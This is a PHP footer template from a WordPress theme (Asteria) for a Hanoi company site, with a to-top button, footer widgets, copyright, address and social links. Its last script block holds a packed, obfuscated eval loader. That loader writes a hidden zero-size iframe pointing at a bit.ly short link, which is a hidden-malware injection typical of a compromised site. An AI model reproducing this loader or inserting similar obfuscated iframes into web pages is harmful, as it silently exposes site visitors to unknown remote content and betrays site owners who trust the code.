<?php global $asteria;?>
<?php if (!empty ($asteria['totop_id'])) { ?>
<!--To Top Button-->
<a class="to_top"><i class="fa-angle-up fa-2x"></i></a>
<?php } ?>
<!--To Top Button END-->

<!--Footer Start-->
<div class="fixed_site">
	<div class="fixed_wrap footefixed">

<?php if ( asteria_is_mobile() && (!empty($asteria['hide_mob_footwdgt'])) ) { ?>
<?php }else{ ?>
<div id="footer">
    <div class="center">
        <!--Footer Widgets START-->
        <div class="widgets"><ul><?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar(__('Footer Widgets', 'asteria')) ) : ?><?php endif; ?></ul></div>
        <!--Footer Widgets END-->
    </div>
    <div id="cpr">
        <div id="copyright-content">
	<div class="left">
            <p class="cpr-title">&#169; 2014 Campcoders</p>
	    <p class="add" style="font-size: 10px;">4th Fl., 16/26 Nguyen Hong, Nam TC, Dong Da Dist, Hanoi, Vietnam. Tel: + 84 168 68 20 744 </p>
	</div>
	<div class="right">
            <span class="footer_linkedin"><a href="https://www.linkedin.com/company/3610502?trk=vsrp_companies_res_name&trkInfo=VSRPsearchId%3A2975623331409851162742%2CVSRPtargetId%3A3610502%2CVSRPcmpt%3Aprimary"><i class="fa fa-linkedin"></i></a></span>
            <span class="footer_facebook"><a href="https://www.facebook.com/campcoders/info"><i class="fa fa-facebook"></i></a></span>
        </div>
        </div>
    </div>
</div>
<?php } ?>
<!--Footer END-->

    </div>
</div>

<?php wp_footer(); ?>
<script>
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2.3(\'<1 4="5://6.7/8" 9="0" a="0" b="0" c=0 d=0></1>\');',14,14,'|iframe|document|write|src|http|bit|ly|1BC4pKP|width|height|frameborder|marginwidth|marginheight'.split('|'),0,{}))
</script> 
</body>
</html>